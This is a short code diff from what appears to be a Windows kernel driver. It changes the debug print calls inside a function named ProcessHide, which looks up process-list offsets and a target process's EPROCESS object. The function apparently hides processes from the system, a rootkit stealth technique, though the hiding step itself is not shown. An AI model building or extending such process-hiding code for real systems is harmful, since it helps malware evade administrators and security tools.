@@ -17,13 +17,13 @@ NTSTATUS ProcessHide(
 	if ( ( ! ( ProcessLockOfs = ProcessLockOffset() ) ) || 
 		 ( ! ( ProcessListOfs = ProcessActiveListOffset() ) ) ) 
 	{
-		PRINTF( "Failed to get offsets ");
+		PUTS( "Failed to get offsets ");
 		goto CLEANUP;
 	}
 
 	/* get Process EPROCESS object by Pid */
 	if ( ! NT_SUCCESS( NtStatus = PsLookupProcessByProcessId( C_PTR( Pid ), &EProcess) ) ) {
-		PRINTF( "PsLookupProcessByProcessId Failed: %p", NtStatus )
+		PRINTF( "PsLookupProcessByProcessId Failed: %p\n", NtStatus )
 		goto CLEANUP;
 	}
 
